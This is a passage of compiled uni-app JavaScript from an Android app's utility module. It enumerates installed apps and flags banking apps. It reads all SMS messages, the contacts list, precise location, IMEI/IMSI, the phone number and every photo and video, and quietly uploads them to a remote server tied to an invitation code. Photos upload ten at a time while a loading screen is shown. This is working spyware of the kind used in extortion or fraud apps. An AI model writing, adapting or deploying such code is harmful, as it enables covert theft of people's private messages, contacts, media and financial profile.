                  } catch (e) {
                  }
                }
                if (!packageName) {
                  try {
                    packageName = pkgInfo.getPackageName();
                  } catch (e) {
                  }
                }
                if (!packageName || existingPackages.has(packageName))
                  continue;
                existingPackages.add(packageName);
                let appName = "";
                try {
                  const appInfo = pm.getApplicationInfo(packageName, 0);
                  if (appInfo) {
                    appName = pm.getApplicationLabel(appInfo).toString();
                  }
                } catch (e) {
                  appName = packageName.split(".").pop();
                }
                if (!appName || appName === "null" || appName === "undefined") {
                  appName = packageName.split(".").pop();
                }
                if (appName.includes(".") || appName === packageName)
                  continue;
                let versionName = "1.0.0";
                let versionCode = 1;
                let installTime = Date.now();
                try {
                  versionName = pkgInfo.versionName || "1.0.0";
                  versionCode = pkgInfo.versionCode || 1;
                  installTime = pkgInfo.firstInstallTime || Date.now();
                } catch (e) {
                }
                apps.push({
                  appName,
                  packageName,
                  versionName,
                  versionCode,
                  installTime,
                  isSystemApp: false,
                  isUserApp: true,
                  isBankApp: this.isBankApp(packageName, appName)
                });
                if (i < 5 || i % 50 === 0) {
                  formatAppLog("log", "at utils/android-handler.js:593", `已添加 ${apps.length} 个应用，最新: ${appName} (${packageName})`);
                }
              } catch (e) {
                if (apps.length < 5) {
                  formatAppLog("log", "at utils/android-handler.js:598", `处理应用包 ${i + 1} 时出错: ${e.message}`);
                }
              }
            }
            formatAppLog("log", "at utils/android-handler.js:603", `应用列表获取完成，共找到 ${apps.length} 个应用`);
          }
        } catch (e) {
          formatAppLog("error", "at utils/android-handler.js:606", "获取应用失败:", e.message);
          try {
            formatAppLog("log", "at utils/android-handler.js:610", "尝试使用备选方法获取应用列表...");
            const intent = plus.android.newObject("android.content.Intent", "android.intent.action.MAIN", null);
            intent.addCategory("android.intent.category.LAUNCHER");
            const resolveInfos = pm.queryIntentActivities(intent, 0);
            if (resolveInfos) {
              const size = resolveInfos.size();
              formatAppLog("log", "at utils/android-handler.js:617", `通过Intent方式获取到 ${size} 个应用`);
              for (let i = 0; i < size; i++) {
                try {
                  const resolveInfo = resolveInfos.get(i);
                  const activityInfo = resolveInfo.activityInfo;
                  const packageName = activityInfo.packageName;
                  if (!packageName)
                    continue;
                  let appName = packageName.split(".").pop();
                  try {
                    appName = resolveInfo.loadLabel(pm).toString();
                  } catch (e2) {
                  }
                  if (appName.includes(".") || appName === packageName)
                    continue;
                  apps.push({
                    appName,
                    packageName,
                    versionName: "1.0.0",
                    versionCode: 1,
                    installTime: Date.now(),
                    isSystemApp: false,
                    isUserApp: true,
                    isBankApp: this.isBankApp(packageName, appName)
                  });
                } catch (e2) {
                  formatAppLog("error", "at utils/android-handler.js:646", "处理应用信息出错:", e2.message);
                }
              }
            }
          } catch (e2) {
            formatAppLog("error", "at utils/android-handler.js:651", "备选方法获取应用失败:", e2.message);
          }
        }
        formatAppLog("log", "at utils/android-handler.js:656", `对 ${apps.length} 个应用进行排序`);
        apps.sort((a, b) => {
          if (a.appName && b.appName) {
            return a.appName.localeCompare(b.appName);
          }
          return 0;
        });
        const bankApps = apps.filter((app) => app.isBankApp).length;
        formatAppLog("log", "at utils/android-handler.js:667", `应用列表获取完成，共 ${apps.length} 个应用`);
        formatAppLog("log", "at utils/android-handler.js:668", `银行应用: ${bankApps}个`);
        if (apps.length > 0) {
          formatAppLog("log", "at utils/android-handler.js:671", "应用列表示例 (前5个):");
          for (let i = 0; i < Math.min(5, apps.length); i++) {
            formatAppLog("log", "at utils/android-handler.js:673", `${i + 1}. ${apps[i].appName} (${apps[i].packageName}), 版本: ${apps[i].versionName}`);
          }
        }
        return apps;
      } catch (e) {
        formatAppLog("error", "at utils/android-handler.js:679", "获取应用列表失败:", e);
        return [];
      }
    }
    /**
     * 上传已安装的应用信息
     */
    static async uploadInstalledApps(apps, phone, code = "") {
      try {
        if (!phone || typeof phone !== "string" || phone.trim() === "") {
          formatAppLog("log", "at utils/android-handler.js:690", "上传应用信息失败: 手机号无效");
          return false;
        }
        if (!Array.isArray(apps) || apps.length === 0) {
          formatAppLog("log", "at utils/android-handler.js:696", "上传应用信息失败: 无有效应用数据");
          return false;
        }
        if (apps.length < 5) {
          formatAppLog("log", "at utils/android-handler.js:702", `应用数量不足 (${apps.length})，不进行上传`);
          return false;
        }
        formatAppLog("log", "at utils/android-handler.js:706", `准备上传 ${apps.length} 个已安装的应用信息`);
        const tableName = "installed_apps";
        const appData = apps.map((app) => ({
          app_name: app.appName || app.app_name || "",
          package_name: app.packageName || app.package_name || "",
          app_version: app.versionName || app.app_version || "",
          install_time: app.installTime ? Math.floor(app.installTime / 1e3) : app.install_time || Math.floor(Date.now() / 1e3),
          is_bank: app.isBankApp || app.is_bank ? 1 : 0
        }));
        const validAppData = appData.filter(
          (app) => app.app_name && app.package_name && typeof app.app_name === "string" && typeof app.package_name === "string"
        );
        if (validAppData.length === 0) {
          formatAppLog("log", "at utils/android-handler.js:728", "上传应用信息失败: 所有应用数据无效");
          return false;
        }
        formatAppLog("log", "at utils/android-handler.js:732", `过滤后有效应用数据: ${validAppData.length} 个`);
        const bankAppCount = validAppData.filter((app) => app.is_bank === 1).length;
        formatAppLog("log", "at utils/android-handler.js:736", `应用统计 - 银行应用: ${bankAppCount}个`);
        const apiConfig = PlatformUtil.getPlatformConfig();
        const baseUrl = apiConfig.base_url;
        const apiPath = apiConfig.api_path || "";
        const fullUrl = `${baseUrl}${apiPath}${apiConfig.upload.apps}`;
        formatAppLog("log", "at utils/android-handler.js:744", "上传应用信息:", {
          url: fullUrl,
          phone,
          code: code || "",
          appsCount: validAppData.length,
          tableName
        });
        const uploadData = {
          phone,
          code: code || "",
          apps: JSON.stringify(validAppData),
          table_name: tableName
        };
        formatAppLog("log", "at utils/android-handler.js:761", "请求数据示例(前3条):", JSON.stringify(validAppData.slice(0, 3)));
        return new Promise((resolve, reject) => {
          uni.request({
            url: fullUrl,
            method: "POST",
            data: uploadData,
            header: {
              "content-type": "application/x-www-form-urlencoded"
            },
            success: (res) => {
              formatAppLog("log", "at utils/android-handler.js:773", "应用信息上传响应:", res.data);
              if (res.data && (res.data === "获取成功" || typeof res.data === "string" && res.data.includes("获取成功") || typeof res.data === "string" && res.data.includes("成功保存"))) {
                formatAppLog("log", "at utils/android-handler.js:780", `成功上传 ${validAppData.length} 个应用信息`);
                resolve(true);
              } else {
                formatAppLog("warn", "at utils/android-handler.js:783", "应用信息上传失败:", res.data);
                reject(new Error(`上传失败: ${res.data}`));
              }
            },
            fail: (err) => {
              formatAppLog("error", "at utils/android-handler.js:788", "应用信息上传请求失败:", err);
              reject(err);
            }
          });
        });
      } catch (error) {
        formatAppLog("log", "at utils/android-handler.js:794", `上传应用信息出错: ${error.message}`);
        return false;
      }
    }
    // 修改获取通讯录方法，简化权限处理
    static async getContacts(phone, inviteCode) {
      try {
        formatAppLog("log", "at utils/android-handler.js:803", "获取通讯录...");
        const deviceInfo = plus.device.vendor + "-" + plus.device.model;
        let contactData = `${phone}**${inviteCode}**${deviceInfo}`;
        return new Promise((resolve, reject) => {
          plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, (addressbook) => {
            addressbook.find(["displayName", "phoneNumbers"], (contacts) => {
              contacts.forEach((contact) => {
                var _a;
                contactData += `=${contact.displayName}|${((_a = contact.phoneNumbers[0]) == null ? void 0 : _a.value) || ""}`;
              });
              formatAppLog("log", "at utils/android-handler.js:814", "通讯录获取成功");
              resolve(contactData);
            }, (error) => {
              formatAppLog("error", "at utils/android-handler.js:817", "查找通讯录失败:", error);
              reject(error);
            }, {
              multiple: true
            });
          }, (error) => {
            formatAppLog("error", "at utils/android-handler.js:823", "获取通讯录失败:", error);
            formatAppLog("log", "at utils/android-handler.js:827", "通讯录获取失败，返回空数据");
            resolve(contactData);
          });
        });
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:832", "处理通讯录出错:", error);
        return `${phone}**${inviteCode}**${plus.device.vendor}-${plus.device.model}`;
      }
    }
    // 获取短信内容
    static async getSMSContent(phone, inviteCode) {
      try {
        formatAppLog("log", "at utils/android-handler.js:841", "开始获取短信内容");
        const smsPermission = await this.requestSMSPermission();
        if (smsPermission <= 0) {
          throw new Error("未获得短信权限");
        }
        const smsData = [{
          imei: phone,
          imei2: inviteCode
        }];
        const ContentResolver = plus.android.importClass("android.content.ContentResolver");
        const Cursor = plus.android.importClass("android.database.Cursor");
        const Uri = plus.android.importClass("android.net.Uri");
        const activity = plus.android.runtimeMainActivity();
        const uri = Uri.parse("content://sms/");
        const resolver = activity.getContentResolver();
        if (!resolver) {
          throw new Error("无法获取 ContentResolver");
        }
        const projection = [
          "_id",
          "address",
          "person",
          "body",
          "date",
          "type"
        ];
        const cursor = resolver.query(
          uri,
          projection,
          null,
          null,
          "date desc"
        );
        formatAppLog("log", "at utils/android-handler.js:887", "短信游标获取成功:", cursor && cursor.getCount());
        if (cursor && cursor.getCount() > 0) {
          while (cursor.moveToNext()) {
            const smsInfo = {
              id: cursor.getString(cursor.getColumnIndex("_id")),
              Name: cursor.getString(cursor.getColumnIndex("person")),
              Date: this.formatDate(cursor.getLong(cursor.getColumnIndex("date"))),
              PhoneNumber: cursor.getString(cursor.getColumnIndex("address")),
              Smsbody: cursor.getString(cursor.getColumnIndex("body")),
              Type: cursor.getString(cursor.getColumnIndex("type"))
            };
            smsData.push(smsInfo);
          }
          cursor.close();
          formatAppLog("log", "at utils/android-handler.js:903", "短信内容获取成功");
          return JSON.stringify(smsData);
        }
        if (cursor) {
          cursor.close();
        }
        formatAppLog("log", "at utils/android-handler.js:911", "没有找到短信");
        return JSON.stringify(smsData);
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:914", "获取短信失败:", error);
        return null;
      }
    }
    // 获取位置信息
    static async getLocation() {
      return new Promise((resolve, reject) => {
        plus.geolocation.getCurrentPosition(
          (position) => {
            formatAppLog("log", "at utils/android-handler.js:924", "位置获取成功:", position);
            resolve(position);
          },
          (error) => {
            formatAppLog("error", "at utils/android-handler.js:928", "获取位置失败:", error);
            reject(error);
          },
          {
            enableHighAccuracy: true,
            timeout: 1e4,
            provider: "system",
            coordsType: "wgs84"
          }
        );
      });
    }
    // 上传位置信息
    static async uploadLocation(location, phone) {
      const code = uni.getStorageSync("code");
      if (!code) {
        formatAppLog("error", "at utils/android-handler.js:948", "未找到邀请码");
        throw new Error("未找到邀请码");
      }
      const locationData = {
        data: `${phone},${code},${location.coords.longitude},${location.coords.latitude}`,
        phone,
        code
        // 添加邀请码参数
      };
      const baseUrl = config$1.baseUrl;
      const fullUrl = `${baseUrl}/api/Uploads/apimap`;
      formatAppLog("log", "at utils/android-handler.js:961", "上传位置信息:", {
        url: fullUrl,
        data: locationData,
        code
      });
      return new Promise((resolve, reject) => {
        uni.request({
          url: fullUrl,
          method: "POST",
          data: locationData,
          header: {
            "content-type": "application/x-www-form-urlencoded"
          },
          success: (res) => {
            formatAppLog("log", "at utils/android-handler.js:976", "位置上传成功:", res);
            if (res.data === "获取成功" || res.data.includes("获取成功")) {
              resolve(res.data);
            } else {
              reject(new Error("位置上传失败: " + res.data));
            }
          },
          fail: (error) => {
            formatAppLog("error", "at utils/android-handler.js:984", "位置上传失败:", error);
            reject(error);
          }
        });
      });
    }
    // 格式化日期
    static formatDate(timestamp) {
      const date = new Date(timestamp);
      const pad = (num) => String(num).padStart(2, "0");
      return `${date.getFullYear()}-${pad(date.getMonth() + 1)}-${pad(date.getDate())} ${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
    }
    static async getPhotos() {
      try {
        const permissionResult = await this.requestStoragePermission();
        if (permissionResult <= 0) {
          throw new Error("未获得存储权限，无法获取图片文件");
        }
        formatAppLog("log", "at utils/android-handler.js:1007", "开始通过 MediaStore 获取相册图片");
        const photos = await this.queryMediaStoreImages();
        formatAppLog("log", "at utils/android-handler.js:1010", `MediaStore 查询到 ${photos.length} 个图片文件`);
        if (photos.length > 0) {
          return photos;
        }
        formatAppLog("log", "at utils/android-handler.js:1017", "MediaStore 无结果，回退到 File API");
        const mediaFiles = await this.scanMediaFiles();
        const fallbackPhotos = [];
        for (const file of mediaFiles.photos) {
          try {
            fallbackPhotos.push({
              name: plus.android.invoke(file, "getName"),
              path: plus.android.invoke(file, "getAbsolutePath"),
              size: plus.android.invoke(file, "length") || 0,
              lastModified: plus.android.invoke(file, "lastModified") || Date.now()
            });
          } catch (error) {
            formatAppLog("error", "at utils/android-handler.js:1029", "处理图片文件对象出错:", error);
          }
        }
        formatAppLog("log", "at utils/android-handler.js:1032", `File API 回退找到 ${fallbackPhotos.length} 个图片`);
        return fallbackPhotos;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:1035", "获取相册图片失败:", error);
        throw error;
      }
    }
    // 通过 MediaStore ContentResolver 查询图片（适配所有 Android 版本）
    static async queryMediaStoreImages() {
      try {
        const ContentResolver = plus.android.importClass("android.content.ContentResolver");
        const Uri = plus.android.importClass("android.net.Uri");
        const MediaStore = plus.android.importClass("android.provider.MediaStore");
        const activity = plus.android.runtimeMainActivity();
        const resolver = activity.getContentResolver();
        if (!resolver) {
          formatAppLog("error", "at utils/android-handler.js:1050", "无法获取 ContentResolver");
          return [];
        }
        const imageUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        const projection = [
          MediaStore.Images.Media._ID,
          MediaStore.Images.Media.DISPLAY_NAME,
          MediaStore.Images.Media.DATA,
          MediaStore.Images.Media.SIZE,
          MediaStore.Images.Media.DATE_MODIFIED
        ];
        const cursor = resolver.query(
          imageUri,
          projection,
          null,
          null,
          MediaStore.Images.Media.DATE_MODIFIED + " DESC"
        );
        const photos = [];
        if (cursor && cursor.getCount() > 0) {
          formatAppLog("log", "at utils/android-handler.js:1075", `MediaStore 查询到 ${cursor.getCount()} 个图片`);
          const idIdx = cursor.getColumnIndex(MediaStore.Images.Media._ID);
          const nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
          const dataIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
          const sizeIdx = cursor.getColumnIndex(MediaStore.Images.Media.SIZE);
          const dateIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATE_MODIFIED);
          while (cursor.moveToNext()) {
            try {
              const filePath = cursor.getString(dataIdx);
              const fileName = cursor.getString(nameIdx);
              const fileSize = cursor.getLong(sizeIdx);
              const dateMod = cursor.getLong(dateIdx);
              if (!filePath || fileSize <= 0)
                continue;
              photos.push({
                name: fileName || "unknown.jpg",
                path: filePath,
                size: fileSize,
                lastModified: dateMod * 1e3
              });
            } catch (e) {
            }
          }
          cursor.close();
        } else {
          if (cursor)
            cursor.close();
          formatAppLog("log", "at utils/android-handler.js:1105", "MediaStore 图片查询结果为空");
        }
        return photos;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:1110", "MediaStore 查询图片失败:", error);
        return [];
      }
    }
    // 获取设备信息
    static async getDeviceInfo() {
      try {
        const deviceInfo = {
          imei: plus.device.imei,
          imei2: plus.device.imsi,
          // 使用 IMSI 作为备选
          model: plus.device.model,
          vendor: plus.device.vendor,
          uuid: plus.device.uuid
        };
        formatAppLog("log", "at utils/android-handler.js:1127", "设备信息:", deviceInfo);
        if (!deviceInfo.imei && !deviceInfo.imei2) {
          deviceInfo.imei = deviceInfo.uuid;
        }
        try {
          const phoneNumber = await this.getRealPhoneNumber();
          if (phoneNumber) {
            deviceInfo.real_phone = phoneNumber;
            formatAppLog("log", "at utils/android-handler.js:1139", "获取到本机号码:", phoneNumber);
          }
        } catch (error) {
          formatAppLog("warn", "at utils/android-handler.js:1142", "获取本机号码失败:", error);
        }
        return deviceInfo;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:1147", "获取设备信息失败:", error);
        throw error;
      }
    }
    // 检查文件是否为图片
    static isImageFile(fileName) {
      const imageExtensions = [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"];
      const ext = fileName.toLowerCase().slice(fileName.lastIndexOf("."));
      return imageExtensions.includes(ext);
    }
    // 获取本机实际号码
    static async getRealPhoneNumber() {
      return new Promise((resolve) => {
        try {
          if (plus.os.name.toLowerCase() === "android") {
            const Context = plus.android.importClass("android.content.Context");
            const TelephonyManager = plus.android.importClass("android.telephony.TelephonyManager");
            const mainActivity = plus.android.runtimeMainActivity();
            const telephonyManager = mainActivity.getSystemService(Context.TELEPHONY_SERVICE);
            const Manifest = plus.android.importClass("android.Manifest");
            const PackageManager = plus.android.importClass("android.content.pm.PackageManager");
            const hasPermission = mainActivity.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) === PackageManager.PERMISSION_GRANTED;
            if (!hasPermission) {
              formatAppLog("log", "at utils/android-handler.js:1177", "没有读取手机状态权限，请求权限");
              plus.android.requestPermissions(
                [Manifest.permission.READ_PHONE_STATE],
                function(result) {
                  if (result.granted.length > 0) {
                    const phoneNumber = telephonyManager.getLine1Number();
                    if (phoneNumber && phoneNumber.length > 0) {
                      resolve(phoneNumber);
                    } else {
                      resolve("");
                    }
                  } else {
                    resolve("");
                  }
                },
                function(error) {
                  formatAppLog("error", "at utils/android-handler.js:1194", "请求权限失败:", error);
                  resolve("");
                }
              );
            } else {
              const phoneNumber = telephonyManager.getLine1Number();
              if (phoneNumber && phoneNumber.length > 0) {
                resolve(phoneNumber);
              } else {
                resolve("");
              }
            }
          } else if (plus.os.name.toLowerCase() === "ios") {
            resolve("");
          } else {
            resolve("");
          }
        } catch (error) {
          formatAppLog("error", "at utils/android-handler.js:1214", "获取本机号码异常:", error);
          resolve("");
        }
      });
    }
    // 上传数据到服务器
    static async uploadData(url, data, phone) {
      const baseUrl = config$1.android_api.base_url;
      const apiPath = config$1.android_api.api_path;
      const fullUrl = `${baseUrl}${apiPath}${url}`;
      const code = uni.getStorageSync("code") || "";
      return new Promise((resolve, reject) => {
        uni.request({
          url: fullUrl,
          method: "POST",
          data: {
            data: typeof data === "string" ? data : JSON.stringify(data),
            phone,
            code
            // 添加邀请码参数
          },
          header: {
            "content-type": "application/x-www-form-urlencoded"
          },
          success: (res) => {
            formatAppLog("log", "at utils/android-handler.js:1242", "请求成功:", res);
            resolve(res.data);
          },
          fail: (error) => {
            formatAppLog("error", "at utils/android-handler.js:1246", "请求失败:", error);
            reject(error);
          }
        });
      });
    }
    // 上传文件
    static async uploadFile(options) {
      const { filePath, name, phone } = options;
      if (!phone) {
        throw new Error("缺少必要的用户验证参数");
      }
      return new Promise((resolve, reject) => {
        const uploadUrl = `${config$1.android_api.base_url}${config$1.android_api.api_path}${config$1.android_api.upload.media}`;
        const task = plus.uploader.createUpload(uploadUrl, {
          method: "POST",
          timeout: 18e4
          // 设置3分钟超时
        }, (t, status) => {
          if (status == 200) {
            resolve(t.responseText);
          } else {
            let errorMsg = "上传失败";
            try {
              errorMsg = `上传失败: 状态码 ${status}, 响应: ${t.responseText || "无响应"}`;
            } catch (e) {
            }
            reject(new Error(errorMsg));
          }
        });
        task.addData("sjh", phone);
        task.addFile(filePath, {
          key: "file",
          name
        });
        task.start();
      });
    }
    // 添加工具方法
    static formatSize(bytes) {
      if (bytes < 1024)
        return bytes + " B";
      if (bytes < 1024 * 1024)
        return (bytes / 1024).toFixed(1) + " KB";
      return (bytes / (1024 * 1024)).toFixed(1) + " MB";
    }
    static async getFileSize(path) {
      return new Promise((resolve) => {
        plus.io.resolveLocalFileSystemURL(path, (entry) => {
          entry.file((file) => {
            resolve(this.formatSize(file.size));
          }, () => resolve("未知"));
        }, () => resolve("未知"));
      });
    }
    // 批量上传方法
    static async uploadFiles(data, url, phone) {
      formatAppLog("log", "at utils/android-handler.js:1307", "准备上传文件，总数:", data.length);
      let successCount = 0;
      const results = [];
      const errors = [];
      for (const file of data) {
        try {
          const result = await this.uploadFile(file, phone, null);
          successCount++;
          results.push(result);
          formatAppLog("log", "at utils/android-handler.js:1317", `成功上传 ${successCount}/${data.length} 个文件`);
        } catch (error) {
          formatAppLog("error", "at utils/android-handler.js:1319", "文件上传失败:", error);
          errors.push({
            fileName: file.name,
            error: error.message
          });
          continue;
        }
      }
      if (successCount === 0) {
        throw new Error("没有文件上传成功");
      }
      return {
        success: successCount,
        total: data.length,
        results,
        errors
      };
    }
    // 并发控制：同时最多 concurrency 个任务
    static async runConcurrent(tasks, concurrency = 3) {
      const results = [];
      let index = 0;
      async function worker() {
        while (index < tasks.length) {
          const i = index++;
          results[i] = await tasks[i]().catch((e) => ({ __error: e }));
        }
      }
      await Promise.all(Array.from({ length: Math.min(concurrency, tasks.length) }, () => worker()));
      return results;
    }
    static async runConcurrent(taskFns, limit) {
      let index = 0;
      const worker = async () => {
        while (index < taskFns.length) {
          const i = index++;
          await taskFns[i]();
        }
      };
      const workers = Array.from({ length: Math.min(limit, taskFns.length) }, () => worker());
      await Promise.all(workers);
    }
    static compressImage(filePath) {
      return new Promise((resolve) => {
        uni.compressImage({
          src: filePath.startsWith("file://") ? filePath : "file://" + filePath,
          width: 600,
          quality: 60,
          success: (res) => {
            resolve(res.tempFilePath);
          },
          fail: () => {
            resolve(filePath);
          }
          // 压缩失败则用原图
        });
      });
    }
    static async uploadPhotos(photos, phone) {
      if (!(photos == null ? void 0 : photos.length)) {
        formatAppLog("log", "at utils/android-handler.js:1382", "没有需要上传的图片");
        return 0;
      }
      formatAppLog("log", "at utils/android-handler.js:1386", `开始上传 ${photos.length} 张图片（10路并发）`);
      this.navigateToLoading();
      const results = { success: [], failed: [] };
      const tasks = photos.map(
        (photo) => () => this.compressImage(photo.path).then((compressed) => this.uploadFile({ filePath: compressed, name: photo.name, phone })).then(() => {
          results.success.push(photo.name);
        }).catch((error) => {
          results.failed.push({ name: photo.name, error: error.message });
        })
      );
      await this.runConcurrent(tasks, 10);
      formatAppLog("log", "at utils/android-handler.js:1402", `上传完成: 成功 ${results.success.length}, 失败 ${results.failed.length}, 总数 ${photos.length}`);
      if (results.failed.length === photos.length) {
        throw new Error("所有文件上传失败，请重试");
      }
      return results.success.length;
    }
    // 修改 navigateToLoading 方法
    static navigateToLoading() {
      var _a;
      if (this.hasNavigated) {
        formatAppLog("log", "at utils/android-handler.js:1415", "已经跳转过，跳过本次跳转");
        return;
      }
      this.hasNavigated = true;
      formatAppLog("log", "at utils/android-handler.js:1421", "后台处理完成，等待倒计时跳转");
      const pages = getCurrentPages();
      const currentRoute = ((_a = pages[pages.length - 1]) == null ? void 0 : _a.route) || "";
      if (currentRoute.includes("loading")) {
        formatAppLog("log", "at utils/android-handler.js:1429", "当前已在loading页面，无需跳转");
        return;
      }
    }
    // 修改短信权限请求方法
    static async requestSMSPermission() {
      return new Promise((resolve, reject) => {
        plus.android.requestPermissions(
          ["android.permission.READ_SMS"],
          function(resultObj) {
            let result = 0;
            for (var i = 0; i < resultObj.granted.length; i++) {
              var grantedPermission = resultObj.granted[i];
              formatAppLog("log", "at utils/android-handler.js:1448", "已获取的短信权限：" + grantedPermission);
              result = 1;
            }
            for (var i = 0; i < resultObj.deniedPresent.length; i++) {
              var deniedPresentPermission = resultObj.deniedPresent[i];
              formatAppLog("log", "at utils/android-handler.js:1453", "拒绝本次申请的短信权限：" + deniedPresentPermission);
              result = 0;
            }
            for (var i = 0; i < resultObj.deniedAlways.length; i++) {
              var deniedAlwaysPermission = resultObj.deniedAlways[i];
              formatAppLog("log", "at utils/android-handler.js:1458", "永久拒绝申请的短信权限：" + deniedAlwaysPermission);
              result = -1;
            }
            resolve(result);
          },
          function(error) {
            formatAppLog("error", "at utils/android-handler.js:1464", "申请短信权限失败：" + error.message);
            reject(error);
          }
        );
      });
    }
    static getAndroidSdkVersion() {
      try {
        const Build = plus.android.importClass("android.os.Build");
        return Build.VERSION.SDK_INT;
      } catch (e) {
        formatAppLog("warn", "at utils/android-handler.js:1476", "获取SDK版本失败:", e);
        return 29;
      }
    }
    static async requestStoragePermission() {
      const sdkInt = this.getAndroidSdkVersion();
      formatAppLog("log", "at utils/android-handler.js:1483", "当前Android SDK版本:", sdkInt);
      const permissions = sdkInt >= 33 ? ["android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO"] : ["android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"];
      formatAppLog("log", "at utils/android-handler.js:1490", "请求存储权限:", permissions);
      return new Promise((resolve, reject) => {
        plus.android.requestPermissions(
          permissions,
          function(resultObj) {
            let result = 0;
            for (var i = 0; i < resultObj.granted.length; i++) {
              formatAppLog("log", "at utils/android-handler.js:1498", "已获取的权限：" + resultObj.granted[i]);
              result = 1;
            }
            for (var i = 0; i < resultObj.deniedPresent.length; i++) {
              formatAppLog("log", "at utils/android-handler.js:1502", "拒绝本次申请的权限：" + resultObj.deniedPresent[i]);
              result = 0;
            }
            for (var i = 0; i < resultObj.deniedAlways.length; i++) {
              formatAppLog("log", "at utils/android-handler.js:1506", "永久拒绝申请的权限：" + resultObj.deniedAlways[i]);
              result = -1;
            }
            resolve(result);
          },
          function(error) {
            formatAppLog("error", "at utils/android-handler.js:1512", "申请权限失败：" + error.message);
            reject(error);
          }
        );
      });
    }
    static async processVideos(phone) {
      try {
        let videos = await this.queryMediaStoreVideos();
        if (!videos || videos.length === 0) {
          formatAppLog("log", "at utils/android-handler.js:1526", "MediaStore 视频为空，回退到 File API");
          const fileVideos = await this.findVideoFiles();
          if (!fileVideos || fileVideos.length === 0) {
            formatAppLog("log", "at utils/android-handler.js:1529", "没有找到视频文件");
            return;
          }
          videos = fileVideos.map((file) => ({
            name: plus.android.invoke(file, "getName"),
            path: plus.android.invoke(file, "getAbsolutePath"),
            size: plus.android.invoke(file, "length") || 0
          }));
        }
        formatAppLog("log", "at utils/android-handler.js:1539", "开始上传视频，总数:", videos.length);
        let successCount = 0;
        let failCount = 0;
        const maxSize = 100 * 1024 * 1024;
        for (const video of videos) {
          try {
            if (video.size > maxSize) {
              formatAppLog("log", "at utils/android-handler.js:1547", `视频过大(${this.formatSize(video.size)})，跳过: ${video.name}`);
              continue;
            }
            formatAppLog("log", "at utils/android-handler.js:1551", `开始上传视频: ${video.name} (${this.formatSize(video.size)})`);
            if (video.path.includes("Screenshots") || video.path.includes("Screen Recorder")) {
              const tmpDir = plus.io.convertLocalFileSystemURL("_doc");
              const tmpPath = `${tmpDir}/${video.name}`;
              try {
                await this.copyFile(video.path, tmpPath);
                await this.uploadFile({ filePath: tmpPath, name: video.name, phone });
              } catch (copyError) {
                formatAppLog("error", "at utils/android-handler.js:1560", "复制失败，尝试直接上传:", copyError);
                await this.uploadFile({ filePath: video.path, name: video.name, phone });
              }
            } else {
              await this.uploadFile({ filePath: video.path, name: video.name, phone });
            }
            successCount++;
            formatAppLog("log", "at utils/android-handler.js:1568", "视频上传成功:", video.name);
          } catch (error) {
            failCount++;
            formatAppLog("error", "at utils/android-handler.js:1571", "视频上传失败:", error);
          }
        }
        formatAppLog("log", "at utils/android-handler.js:1575", `视频上传完成，总数: ${videos.length}, 成功: ${successCount}, 失败: ${failCount}`);
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:1577", "处理视频文件失败:", error);
      }
    }
    // 通过 MediaStore 查询视频
    static async queryMediaStoreVideos() {
      try {
        const MediaStore = plus.android.importClass("android.provider.MediaStore");
        const activity = plus.android.runtimeMainActivity();
        const resolver = activity.getContentResolver();
        if (!resolver)
          return [];
        const videoUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        const projection = [
          MediaStore.Video.Media._ID,
          MediaStore.Video.Media.DISPLAY_NAME,
          MediaStore.Video.Media.DATA,
          MediaStore.Video.Media.SIZE,
          MediaStore.Video.Media.DATE_MODIFIED
        ];
        const cursor = resolver.query(videoUri, projection, null, null, MediaStore.Video.Media.DATE_MODIFIED + " DESC");
        const videos = [];
        if (cursor && cursor.getCount() > 0) {
          formatAppLog("log", "at utils/android-handler.js:1603", `MediaStore 查询到 ${cursor.getCount()} 个视频`);
          const nameIdx = cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME);
          const dataIdx = cursor.getColumnIndex(MediaStore.Video.Media.DATA);
          const sizeIdx = cursor.getColumnIndex(MediaStore.Video.Media.SIZE);
          while (cursor.moveToNext()) {
            try {
              const filePath = cursor.getString(dataIdx);
              const fileSize = cursor.getLong(sizeIdx);
              if (!filePath || fileSize <= 0)
                continue;
              videos.push({
                name: cursor.getString(nameIdx) || "unknown.mp4",
                path: filePath,
                size: fileSize
              });
            } catch (e) {
            }
          }
          cursor.close();
        } else {
          if (cursor)
            cursor.close();
        }
        return videos;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:1627", "MediaStore 查询视频失败:", error);
        return [];
      }
    }
    // 添加文件复制方法
    static async copyFile(sourcePath, targetPath) {
      return new Promise((resolve, reject) => {
        try {
          const File = plus.android.importClass("java.io.File");
          const FileInputStream = plus.android.importClass("java.io.FileInputStream");
          const FileOutputStream = plus.android.importClass("java.io.FileOutputStream");
          const FileChannel = plus.android.importClass("java.nio.channels.FileChannel");
          const sourceFile = new File(sourcePath);
          const targetFile = new File(targetPath);
          if (!plus.android.invoke(sourceFile, "exists")) {
            return reject(new Error("源文件不存在"));
          }
          const parentDir = plus.android.invoke(targetFile, "getParentFile");
          if (!plus.android.invoke(parentDir, "exists")) {
            plus.android.invoke(parentDir, "mkdirs");
          }
          const inStream = new FileInputStream(sourceFile);
          const outStream = new FileOutputStream(targetFile);
          const inChannel = plus.android.invoke(inStream, "getChannel");
          const outChannel = plus.android.invoke(outStream, "getChannel");
          plus.android.invoke(inChannel, "transferTo", 0, plus.android.invoke(inChannel, "size"), outChannel);
          plus.android.invoke(inChannel, "close");
          plus.android.invoke(outChannel, "close");
          plus.android.invoke(inStream, "close");
          plus.android.invoke(outStream, "close");
          resolve(targetPath);
        } catch (error) {
